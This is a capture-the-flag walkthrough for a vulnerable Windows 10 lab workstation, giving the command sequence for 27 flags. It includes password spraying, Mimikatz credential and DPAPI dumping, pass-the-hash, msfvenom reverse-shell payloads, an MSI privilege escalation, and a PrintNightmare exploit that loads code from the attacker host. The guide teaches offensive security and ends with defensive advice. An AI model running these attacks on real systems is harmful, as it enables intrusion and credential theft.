# Windows 10 Workstation (DESKTOP-TEI5A1Q) CTF Flag Capture Guide
## Pokemon CTF v5 - Complete Flag Instructions

### Environment Setup
- **Target Workstation IP**: 192.168.1.124 (DESKTOP-TEI5A1Q)
- **Attacker Kali IP**: 192.168.1.7
- **Total Flags**: 27
- **Total Points**: 720

### Prerequisites
Before starting, ensure you have:
- Kali Linux with standard penetration testing tools
- Evil-WinRM installed (`gem install evil-winrm`)
- Impacket tools installed
- Mimikatz.exe ready for upload
- Python HTTP server for file transfers
- Git for cloning exploit repositories

---

## Phase 1: User Enumeration

### FLAG 001: User Full Name Field (10 points)
**Discovery Method**: RPC enumeration reveals flag in user's full name
```bash
# Connect via RPC with null session
rpcclient -U "" -N 192.168.1.124

# At the rpcclient prompt:
rpcclient $> enumdomusers
# Lists all domain users

rpcclient $> queryuser jsmith
# Look for the Full Name field:
# Full Name   :   John Smith - FLAG{MEW23686701}

rpcclient $> quit
```

---

## Phase 2: Password Discovery

### Discovering Valid Credentials
```bash
# Create user list
cat > workstation_users.txt << EOF
Administrator
jsmith
mjones
developer
helpdesk
tempuser
svc_backup
debuguser
localadmin
EOF

# Create password list
cat > workstation_passwords.txt << EOF
Password1
Password123
Password123!
Welcome1
admin123
dev123
help123
temp
Backup2020!
Debug123!
EOF

# Perform password spray
crackmapexec smb 192.168.1.124 -u workstation_users.txt -p workstation_passwords.txt --continue-on-success
```

**Valid Credentials Discovered**:
- jsmith:Welcome1
- mjones:Password1
- developer:dev123
- helpdesk:help123
- tempuser:temp
- svc_backup:Backup2020!
- debuguser:Debug123!
- localadmin:admin123 (Local Admin!)

### FLAG 002: Hidden User Account (20 points)
**Discovery Method**: RID cycling with valid credentials
```bash
# Use discovered credentials for RID cycling
impacket-lookupsid jsmith:Welcome1@192.168.1.124

# Scan through output for RID 1078
# You'll find: 1078: DESKTOP-TEI5A1Q\FLAG{RAICHU62619281} (SidTypeUser)
```

---

## Phase 3: File System Exploration

### Establish SMB Connection
```bash
# List available shares
smbclient -L //192.168.1.124 -U jsmith%Welcome1
```

### FLAG 006: WiFi Password File (10 points)
**Location**: Public Documents folder
```bash
# Connect to Users share
smbclient //192.168.1.124/Users -U jsmith%Welcome1

# Navigate and retrieve file
smb: \> cd Public\Documents
smb: \> ls
smb: \> get wifi.txt
smb: \> !cat wifi.txt
# Output: Flag: FLAG{PIDGEOT09053920}
smb: \> quit
```

### FLAG 007: Email Credentials File (15 points)
**Location**: Passwords subfolder
```bash
# Connect to Users share
smbclient //192.168.1.124/Users -U jsmith%Welcome1

smb: \> cd Public\Documents\Passwords
smb: \> ls
smb: \> get email.txt
smb: \> !cat email.txt
# Output: // FLAG{FEAROW08818758}
# Also contains: Administrator@overclock.io / Password123!
smb: \> quit
```

### FLAG 008: Hidden File Discovery (25 points)
**Location**: Hidden file in WorkFiles directory
```bash
# Connect via Evil-WinRM
evil-winrm -i 192.168.1.124 -u jsmith -p Welcome1

# Navigate to WorkFiles
*Evil-WinRM* PS C:\Users\jsmith\Documents> cd C:\WorkFiles

# Show hidden files
*Evil-WinRM* PS C:\WorkFiles> Get-ChildItem -Force

# Read hidden flag file
*Evil-WinRM* PS C:\WorkFiles> Get-Content .flag
# Output: FLAG{SANDSLASH22756452}
```

### FLAG 009: Browser Credential Extraction (30 points)
**Location**: Chrome password database
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> cd "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Google\Chrome\User Data\Default> ls

# Extract flag from Login Data
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Google\Chrome\User Data\Default> type "Login Data" | Select-String FLAG
# Output: "flag":"FLAG{NIDOQUEEN75067246}"
```

---

## Phase 4: Memory Exploitation with Mimikatz

### FLAG 003: LSASS Memory Dump (45 points)
**Location**: WDigest credentials in memory
```bash
# In Evil-WinRM session as jsmith:
*Evil-WinRM* PS C:\Users\jsmith\Documents> cd C:\Temp

# Start Python HTTP server on Kali:
# python3 -m http.server 8000

# Download Mimikatz
*Evil-WinRM* PS C:\Temp> Invoke-WebRequest -Uri http://192.168.1.7:8000/mimikatz.exe -OutFile mimikatz.exe

# Run Mimikatz
*Evil-WinRM* PS C:\Temp> .\mimikatz.exe

# In Mimikatz prompt:
mimikatz # privilege::debug
# Output: Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
# Look for jsmith's wdigest section:
# * Flag     : FLAG{BLASTOISE85932580}

mimikatz # exit
```

### FLAG 004: Debug Privilege Exploitation (40 points)
**Location**: Registry key requiring debug privileges
```bash
# Login as debuguser
evil-winrm -i 192.168.1.124 -u debuguser -p Debug123!

# Check privileges
*Evil-WinRM* PS C:\Users\debuguser\Documents> whoami /priv
# Verify SeDebugPrivilege is enabled

# Query special registry key
*Evil-WinRM* PS C:\Users\debuguser\Documents> reg query HKLM\SOFTWARE\DebugPrivileges /v WorkstationFlag
# Output: WorkstationFlag    REG_SZ    FLAG{VENUSAUR49841932}
```

### FLAG 005: Pass-the-Hash Attack (50 points)
**Location**: Administrator desktop after PTH
```bash
# Use localadmin NTLM hash from Mimikatz (8c6f5e2753e1d7606e5a2e66d1a0ee3f)
# From Kali:
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c6f5e2753e1d7606e5a2e66d1a0ee3f localadmin@192.168.1.124

# In SYSTEM shell:
C:\Windows\system32> whoami
# Output: nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\pth_workstation_flag.txt
# Output: FLAG{BUTTERFREE00071950}
C:\Windows\system32> exit
```

---

## Phase 5: Service Exploitation

### FLAG 010: Unquoted Service Path - FakeAntivirus (25 points)
**Location**: Exploiting FakeAntivirus service
```bash
# On Kali, create exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe > Antivirus.exe

# Start listener:
nc -lvnp 4444

# In Evil-WinRM session:
evil-winrm -i 192.168.1.124 -u jsmith -p Welcome1

# Check service paths
*Evil-WinRM* PS C:\> wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"

# Upload exploit
*Evil-WinRM* PS C:\> upload Antivirus.exe "C:\Program Files\Antivirus.exe"

# Stop and start the service
*Evil-WinRM* PS C:\> sc.exe stop FakeAntivirus
*Evil-WinRM* PS C:\> sc.exe start FakeAntivirus

# In netcat listener (SYSTEM shell):
C:\Windows\system32> type C:\ws_unquoted1.txt
# Output: FLAG{NIDOKING94048236}
```

### FLAG 011: Unquoted Service Path - BackupManager (30 points)
**Location**: Exploiting BackupManager service
```bash
# Use same exploit from FLAG 010
# In Evil-WinRM:
*Evil-WinRM* PS C:\> copy "C:\Program Files\Antivirus.exe" "C:\Program Files\Backup.exe"
*Evil-WinRM* PS C:\> sc.exe stop BackupManager
*Evil-WinRM* PS C:\> sc.exe start BackupManager

# In SYSTEM shell:
C:\Windows\system32> type C:\ws_unquoted2.txt
# Output: FLAG{CLEFABLE09888919}
```

### FLAG 012: Unquoted Service Path - RemoteSupportAgent (35 points)
**Location**: Exploiting RemoteSupportAgent service
```bash
# In Evil-WinRM:
*Evil-WinRM* PS C:\> copy "C:\Program Files\Antivirus.exe" "C:\Program Files (x86)\Remote.exe"
*Evil-WinRM* PS C:\> sc.exe stop RemoteSupportAgent
*Evil-WinRM* PS C:\> sc.exe start RemoteSupportAgent

# In SYSTEM shell:
C:\Windows\system32> type C:\ws_unquoted3.txt
# Output: FLAG{NINETALES43035416}
```

### FLAG 013: AlwaysInstallElevated MSI (40 points)
**Location**: Exploiting AlwaysInstallElevated policy
```bash
# First, verify the vulnerability exists:
*Evil-WinRM* PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# On Kali, create malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=5555 -f msi -o evil.msi

# Start listener:
nc -lvnp 5555

# In Evil-WinRM:
*Evil-WinRM* PS C:\> mkdir C:\Temp 2>$null
*Evil-WinRM* PS C:\> upload evil.msi C:\Temp\evil.msi
*Evil-WinRM* PS C:\> msiexec /quiet /qn /i C:\Temp\evil.msi

# In SYSTEM shell:
C:\Windows\system32> type C:\Users\Administrator\Desktop\msi_privesc_flag.txt
# Output: FLAG{WIGGLYTUFF69905375}
```

### FLAG 014: PrintNightmare Exploitation (45 points)
**Location**: Exploiting Print Spooler vulnerability
```bash
# On Kali, setup exploit:
git clone https://github.com/cube0x0/CVE-2021-34527.git
cd CVE-2021-34527

# Create payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=6666 -f dll > nightmare.dll

# Start SMB server and listener
impacket-smbserver share . -smb2support
nc -lvnp 6666

# Run exploit
python3 CVE-2021-34527.py 'jsmith:Welcome1@192.168.1.124' '\\192.168.1.7\share\nightmare.dll'

# In SYSTEM shell:
C:\Windows\system32> type C:\Windows\System32\spool\drivers\color\workstation_spooler_flag.txt
# Output: FLAG{GOLBAT58469705}
```

---

## Phase 6: Persistence Mechanisms

### FLAG 015: Startup Folder Analysis (20 points)
**Location**: User startup folder
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.bat"
# Output contains: REM Flag: FLAG{VILEPLUME23467851}
```

### FLAG 016: Registry Run Key (25 points)
**Location**: HKCU Run registry
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
# Shows: Updater with FLAG{PARASECT86843125}

# Execute the command
*Evil-WinRM* PS C:\> cmd /c echo FLAG{PARASECT86843125}
# Output: FLAG{PARASECT86843125}
```

### FLAG 017: Scheduled Task (25 points)
**Location**: DailyUpdate scheduled task
```bash
# In Evil-WinRM session:
# View task details
*Evil-WinRM* PS C:\> schtasks /query /tn DailyUpdate /fo LIST /v | findstr "Task To Run"

# Run the task
*Evil-WinRM* PS C:\> schtasks /run /tn DailyUpdate

# Wait a moment, then read the flag
*Evil-WinRM* PS C:\> Get-Content C:\temp\task_ws.txt
# Output: FLAG{VENOMOTH43501590}
```

---

## Phase 7: Configuration and Credential Storage

### FLAG 018: VPN Configuration (20 points)
**Location**: VPN configuration file
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Credentials\vpn.txt
# Output contains: Secret: FLAG{DUGTRIO06075219}
```

### FLAG 019: PowerShell Credential Object (25 points)
**Location**: Exported credential XML
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Credentials\admin.xml | Select-String FLAG
# Output: <!-- Flag: FLAG{PERSIAN04938649} -->

# Also extract the stored credentials:
*Evil-WinRM* PS C:\> $cred = Import-Clixml C:\Users\Public\Documents\Credentials\admin.xml
*Evil-WinRM* PS C:\> $cred.GetNetworkCredential() | Format-List
# Shows Administrator password
```

### FLAG 020: Macro Document Analysis (15 points)
**Location**: Malicious macro document
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> cd C:\Users\Public\Documents\Important

# Read the macro document as binary and convert to text
*Evil-WinRM* PS C:\> $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\Documents\Important\Invoice.docm")
*Evil-WinRM* PS C:\> $text = [System.Text.Encoding]::ASCII.GetString($bytes)
*Evil-WinRM* PS C:\> $text | Select-String FLAG
# Output: ' Flag: FLAG{GOLDUCK70820258}
```

### FLAG 021: HTA Application (25 points)
**Location**: HTA application source
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-Content C:\Users\Public\Documents\Important\portal.hta | Select-String FLAG
# Output: <!-- Flag: FLAG{PRIMEAPE27510935} -->
```

---

## Phase 8: Advanced Techniques

### FLAG 022: DLL Hijacking Path (35 points)
**Location**: Writable PATH directory
```bash
# In Evil-WinRM session:
# Check PATH for writable directories
*Evil-WinRM* PS C:\> $env:PATH -split ';'

# Check permissions on custom directory
*Evil-WinRM* PS C:\> icacls C:\ProgramData\Custom
# Shows Everyone:(F) - Full control

# Read the flag hint
*Evil-WinRM* PS C:\> Get-Content C:\ProgramData\Custom\readme.txt
# Output: REM Flag: FLAG{GROWLITHE48069249}
```

### FLAG 023: Desktop Shortcut Properties (10 points)
**Location**: Shortcut file metadata
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> $sh = New-Object -ComObject WScript.Shell
*Evil-WinRM* PS C:\> $shortcut = $sh.CreateShortcut("C:\Users\Public\Desktop\Server Shares.lnk")
*Evil-WinRM* PS C:\> $shortcut | Select-Object Description
# Output: Connect to server - Flag: FLAG{POLIWHIRL34647050}
```

### FLAG 024: Clipboard Contents (15 points)
**Location**: Current clipboard data
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> Get-Clipboard
# Output: FLAG{KADABRA46984238}
# May also contain: Important: Remember to update the database password to Str0ng3r!P@ss2024
```

### FLAG 025: Recycle Bin Recovery (20 points)
**Location**: Deleted file in recycle bin
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> cd 'C:\$Recycle.Bin'
*Evil-WinRM* PS C:\$Recycle.Bin> Get-ChildItem -Force -Recurse

# Find the user's recycle bin SID folder
*Evil-WinRM* PS C:\$Recycle.Bin> cd S-1-5-21-3335744492-2692836348-3144141625-1001
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-3335744492-2692836348-3144141625-1001> ls -Force

# Read the recycled file
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-3335744492-2692836348-3144141625-1001> Get-Content "`$R8KJH3D.txt"
# Output: deleted_flag.txt: FLAG{MACHOKE42992509}
```

### FLAG 026: Sticky Notes Database (25 points)
**Location**: Windows Sticky Notes SQLite database
```bash
# In Evil-WinRM session:
# Navigate to Sticky Notes folder
*Evil-WinRM* PS C:\> cd "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"

# List database files
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> ls

# Read the SQLite database as text
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> $bytes = [System.IO.File]::ReadAllBytes("plum.sqlite")
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> $text = [System.Text.Encoding]::UTF8.GetString($bytes)
*Evil-WinRM* PS C:\Users\jsmith\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState> $text | Select-String FLAG
# Output: Remember the flag is FLAG{WEEPINBELL56632373}
```

### FLAG 027: DPAPI Decryption (40 points)
**Location**: DPAPI encrypted blob
```bash
# In Evil-WinRM session:
*Evil-WinRM* PS C:\> cd C:\Users\Public\Documents

# Upload Mimikatz if not already present
*Evil-WinRM* PS C:\Users\Public\Documents> upload mimikatz.exe

# Run Mimikatz
*Evil-WinRM* PS C:\Users\Public\Documents> .\mimikatz.exe

# Extract DPAPI master keys
mimikatz # sekurlsa::dpapi
# Note the MasterKey for jsmith's GUID
# MasterKey : 7a4e9d447b2c4e8a9f6b3d1e5c8a9d2f3b5e7c1a8d4f6b2e9a7c5d3f1b8e4a6c

# Decrypt the DPAPI blob
mimikatz # dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin /masterkey:7a4e9d447b2c4e8a9f6b3d1e5c8a9d2f3b5e7c1a8d4f6b2e9a7c5d3f1b8e4a6c
# Output: Decrypted data: FLAG{TENTACRUEL90563793}

mimikatz # exit
```

---

## Summary

### Total Flags Captured: 27
### Total Points: 720

### Flag Summary Table
| Flag # | Pokemon | Points | Method |
|--------|---------|--------|--------|
| 001 | MEW | 10 | User Full Name |
| 002 | RAICHU | 20 | Hidden User RID |
| 003 | BLASTOISE | 45 | Mimikatz WDigest |
| 004 | VENUSAUR | 40 | Debug Privilege |
| 005 | BUTTERFREE | 50 | Pass-the-Hash |
| 006 | PIDGEOT | 10 | WiFi Password |
| 007 | FEAROW | 15 | Email Credentials |
| 008 | SANDSLASH | 25 | Hidden File |
| 009 | NIDOQUEEN | 30 | Browser Passwords |
| 010 | NIDOKING | 25 | Unquoted Path #1 |
| 011 | CLEFABLE | 30 | Unquoted Path #2 |
| 012 | NINETALES | 35 | Unquoted Path #3 |
| 013 | WIGGLYTUFF | 40 | AlwaysInstallElevated |
| 014 | GOLBAT | 45 | PrintNightmare |
| 015 | VILEPLUME | 20 | Startup Folder |
| 016 | PARASECT | 25 | Registry Run |
| 017 | VENOMOTH | 25 | Scheduled Task |
| 018 | DUGTRIO | 20 | VPN Config |
| 019 | PERSIAN | 25 | PowerShell Cred |
| 020 | GOLDUCK | 15 | Macro Document |
| 021 | PRIMEAPE | 25 | HTA Application |
| 022 | GROWLITHE | 35 | DLL Hijacking |
| 023 | POLIWHIRL | 10 | Shortcut Properties |
| 024 | KADABRA | 15 | Clipboard |
| 025 | MACHOKE | 20 | Recycle Bin |
| 026 | WEEPINBELL | 25 | Sticky Notes |
| 027 | TENTACRUEL | 40 | DPAPI Decryption |

### Attack Phases Summary
1. **Reconnaissance** - User enumeration, service discovery
2. **Credential Access** - Password spraying, credential discovery
3. **Initial Access** - SMB/WinRM authentication
4. **Privilege Escalation** - Service exploitation, MSI abuse
5. **Credential Dumping** - Mimikatz, PTH attacks
6. **Persistence** - Registry, scheduled tasks, startup
7. **Data Exfiltration** - File discovery, credential extraction
8. **Advanced Techniques** - DPAPI, clipboard, forensics

### Key Vulnerabilities Exploited
1. Weak passwords (Welcome1, Password1)
2. Unquoted service paths (3 services)
3. AlwaysInstallElevated policy
4. PrintNightmare (CVE-2021-34527)
5. WDigest plaintext storage
6. Pass-the-Hash vulnerability
7. DPAPI master key extraction
8. Information disclosure in files/registry

### Required Tools
- Evil-WinRM
- Impacket suite (psexec, smbserver, lookupsid)
- Mimikatz
- Metasploit (msfvenom)
- Standard Kali tools (smbclient, rpcclient, netcat)
- PrintNightmare exploit
- Python HTTP server

### Defensive Recommendations
1. Enforce strong password policies
2. Quote all service paths
3. Disable AlwaysInstallElevated
4. Patch PrintNightmare vulnerability
5. Disable WDigest authentication
6. Implement proper file permissions
7. Enable and monitor audit logs
8. Regular security assessments

---

*This guide is for educational purposes in authorized environments only.*
